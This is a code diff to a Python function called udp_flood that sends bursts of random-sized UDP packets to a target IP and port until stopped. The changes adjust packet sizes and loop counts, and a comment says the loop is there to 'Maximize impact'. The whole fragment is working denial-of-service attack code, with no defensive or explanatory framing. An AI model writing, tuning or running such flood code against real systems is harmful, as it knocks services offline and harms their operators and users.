@@ -22,9 +22,9 @@ def udp_flood(target_ip, target_port, stop_flag):
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow socket address reuse
     while not stop_flag.is_set():
         try:
-            packet_size = random.randint(64, 1469)  # Random packet size
+            packet_size = random.randint(512, 4096)  # Random packet size
             data = os.urandom(packet_size)  # Generate random data
-            for _ in range(100000):  # Maximize impact by sending multiple packets
+            for _ in range(50000):  # Maximize impact by sending multiple packets
                 sock.sendto(data, (target_ip, target_port))
         except Exception as e:
             logging.error(f"Error sending packets: {e}")
